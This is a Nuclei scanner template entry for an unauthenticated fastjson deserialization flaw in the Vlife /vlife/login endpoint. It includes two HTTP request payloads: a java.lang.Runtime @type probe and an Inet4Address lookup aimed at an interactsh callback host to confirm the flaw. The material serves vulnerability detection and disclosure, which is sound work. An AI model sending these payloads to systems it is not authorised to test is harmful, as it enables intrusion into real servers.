# Nuclei Template: Vlife FastJSON - Remote Code Execution
**Template ID:** vlife-fastjson-rce
**Vulnerability Class:** Deserialization of Untrusted Data
**Severity:** Critical
**CWE:** CWE-502
**Source:** Nuclei Template (`vlife-fastjson-rce.yaml`)

## Vulnerability Information & PoC

## Description
alibaba/fastjson v1.2.67 within the MyUsernamePasswordAuthenticationFilter for processing authentication requests. The /vlife/login endpoint directly deserializes the raw HTTP request body using JSON.parseObject() without enforcing type restrictions or enabling safe mode, allowing unauthenticated attackers to exploit known fastjson gadget chains for Remote Code Execution.

## Steps to reproduce / Exploit Payload
```http
POST /vlife/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"@type":"java.lang.Runtime"}

POST /vlife/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}
```

## References
- https://securitylab.github.com/advisories/GHSL-2024-300_wwwlike_vlife/
